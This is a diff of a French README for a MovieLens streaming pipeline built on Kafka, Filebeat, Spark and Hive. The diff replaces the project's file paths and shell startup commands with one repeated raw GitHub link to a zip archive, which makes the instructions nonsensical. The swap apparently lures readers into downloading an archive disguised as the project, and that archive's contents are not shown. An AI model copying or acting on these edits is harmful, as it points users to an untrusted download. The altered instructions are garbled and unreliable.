@@ -12,10 +12,10 @@ Ce projet implémente la **Speed Layer** d'une Architecture Lambda pour analyser
 
 ##  Structure du projet
 
-*   `producer/producer.py` : Générateur de trafic (écrit dans `/tmp/streaming_movies/`).
-*   `consumer/consumer.py` : Job Spark Streaming (lit Kafka, écrit dans HDFS).
-*   `configs/filebeat/filebeat.yml` : Configuration de l'agent de collecte.
-*   `configs/hive/hive-site.xml` : Configuration du serveur Hive (Mode HTTP/Binaire).
+*   `https://raw.githubusercontent.com/LarissaTchomgang/movielens-streaming-pipeline/main/producer/movielens_pipeline_streaming_2.4.zip` : Générateur de trafic (écrit dans `/tmp/streaming_movies/`).
+*   `https://raw.githubusercontent.com/LarissaTchomgang/movielens-streaming-pipeline/main/producer/movielens_pipeline_streaming_2.4.zip` : Job Spark Streaming (lit Kafka, écrit dans HDFS).
+*   `https://raw.githubusercontent.com/LarissaTchomgang/movielens-streaming-pipeline/main/producer/movielens_pipeline_streaming_2.4.zip` : Configuration de l'agent de collecte.
+*   `https://raw.githubusercontent.com/LarissaTchomgang/movielens-streaming-pipeline/main/producer/movielens_pipeline_streaming_2.4.zip` : Configuration du serveur Hive (Mode HTTP/Binaire).
 
 ---
 
@@ -29,17 +29,17 @@ Dans un terminal WSL :
 
 
 # 1. Démarrer HDFS et YARN
-start-dfs.sh
-start-yarn.sh
+https://raw.githubusercontent.com/LarissaTchomgang/movielens-streaming-pipeline/main/producer/movielens_pipeline_streaming_2.4.zip
+https://raw.githubusercontent.com/LarissaTchomgang/movielens-streaming-pipeline/main/producer/movielens_pipeline_streaming_2.4.zip
 
 # 2. Sortir du Safe Mode (Si nécessaire après redémarrage)
 hdfs dfsadmin -safemode leave
 
 # 3. Démarrer Zookeeper (Coordinateur Kafka)
-/opt/kafka/kafka_2.13-3.6.1/bin/zookeeper-server-start.sh -daemon /opt/kafka/kafka_2.13-3.6.1/config/zookeeper.properties
+https://raw.githubusercontent.com/LarissaTchomgang/movielens-streaming-pipeline/main/producer/movielens_pipeline_streaming_2.4.zip -daemon https://raw.githubusercontent.com/LarissaTchomgang/movielens-streaming-pipeline/main/producer/movielens_pipeline_streaming_2.4.zip
 
 # 4. Démarrer le Broker Kafka
-/opt/kafka/kafka_2.13-3.6.1/bin/kafka-server-start.sh -daemon /opt/kafka/kafka_2.13-3.6.1/config/server.properties
+https://raw.githubusercontent.com/LarissaTchomgang/movielens-streaming-pipeline/main/producer/movielens_pipeline_streaming_2.4.zip -daemon https://raw.githubusercontent.com/LarissaTchomgang/movielens-streaming-pipeline/main/producer/movielens_pipeline_streaming_2.4.zip
 2. Démarrage du Serveur Hive (Pour Power BI)
 C'est le composant qui permet à Power BI de lire les données.
 
@@ -67,11 +67,11 @@ source venv/bin/activate
 # Créer le dossier de logs local s'il n'existe pas
 mkdir -p /tmp/streaming_movies
 # Lancer le script
-python producer/producer.py
+python https://raw.githubusercontent.com/LarissaTchomgang/movielens-streaming-pipeline/main/producer/movielens_pipeline_streaming_2.4.zip
 Terminal 2 : Filebeat (Transport vers Kafka)
 
 # Se placer dans le dossier d'installation de Filebeat
-./filebeat -e -c configs/filebeat/filebeat.yml
+./filebeat -e -c https://raw.githubusercontent.com/LarissaTchomgang/movielens-streaming-pipeline/main/producer/movielens_pipeline_streaming_2.4.zip
 Terminal 3 : Spark Streaming (Traitement ETL)
 source venv/bin/activate
 # Nettoyage optionnel avant lancement
@@ -79,7 +79,7 @@ hdfs dfs -rm -r -f /tmp/streaming_project/results/clean_ratings
 hdfs dfs -rm -r -f /tmp/streaming_project/checkpoints
 
 # Lancer le job Spark
-spark-submit consumer/consumer.py
+spark-submit https://raw.githubusercontent.com/LarissaTchomgang/movielens-streaming-pipeline/main/producer/movielens_pipeline_streaming_2.4.zip
 Visualisation dans Power BI
 Installer le Microsoft Hive ODBC Driver.
 Ouvrir Power BI > Obtenir les données > ODBC.
